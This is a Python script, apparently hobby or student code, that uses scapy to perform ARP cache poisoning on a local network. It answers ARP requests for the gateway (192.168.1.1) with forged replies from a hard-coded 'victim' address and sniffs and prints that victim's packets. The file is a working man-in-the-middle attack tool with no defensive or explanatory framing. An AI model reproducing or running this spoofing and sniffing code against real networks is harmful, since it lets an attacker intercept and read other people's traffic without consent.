import threading
import time

import scapy.all as scapy
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP
from scapy.sendrecv import sniff

from utils import get_local_mac_address
from states import get_tracking_state, get_is_tracked, change_is_tracked_state, change_tracking_state

victims_data_by_ips = {}
thread_stops_flags = {}


def handle_victim_sniff(packet, victim_ip):
    if IP in packet and packet[IP].src == victim_ip:
        # Process or print information about the captured packet
        print(packet.summary())


def victim_caught(victim_ip, victim_mac, gateway_ip, my_mac):
    """
    :param victim_ip:
    :param gateway_ip:
    :param victim_mac:
    :param my_mac:
    :return:
    """
    change_is_tracked_state(True)
    arp_segment_to_victim = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, hwsrc=my_mac, psrc=gateway_ip)

    sniff_victim_handler = lambda packet: handle_victim_sniff(packet, victim_ip)
    sniff(filter=f"src {victim_ip}", prn=sniff_victim_handler)

    for _ in range(4):
        scapy.send(arp_segment_to_victim)
        time.sleep(0.5)


def handles_arp_requests(packet, gateway_ip, local_mac):
    """ Arp Cache poisoning """
    if ARP in packet and packet[ARP].pdst == gateway_ip and packet[ARP].op == 1 and (packet[ARP].psrc == "192.168.1.106"):
        if victims_data_by_ips.get(packet[ARP].psrc) is None:
            arp_segment = ARP(op=2, hwdst=packet[ARP].hwsrc, pdst=packet[ARP].psrc, hwsrc=local_mac, psrc=gateway_ip)
            scapy.send(arp_segment)
            # victims_data_by_ips[packet[ARP].psrc] = {}
            print(packet[ARP].psrc)


def track_victims(gateway_ip, local_mac):
    """ Sniffing Arp requests """
    arp_handler = lambda packet: handles_arp_requests(packet, gateway_ip, local_mac)

    while get_tracking_state():
        if get_is_tracked():
            scapy.sniff(filter=f"arp and arp[6:2] = 1", prn=arp_handler)
            change_is_tracked_state(False)
        else:
            time.sleep(1)


def main():
    # LOCAL_IP = get_local_ip()
    LOCAL_MAC = get_local_mac_address()
    # GATEWAY_IP = get_gateway_ip()
    GATEWAY_IP = "192.168.1.1"

    tracker_thread = threading.Thread(target=track_victims, daemon=True, args=[GATEWAY_IP, LOCAL_MAC])
    tracker_thread.start()
    print("started tracking for arp requests...\n")

    while True:
        time.sleep(1)


if __name__ == '__main__':
    main()
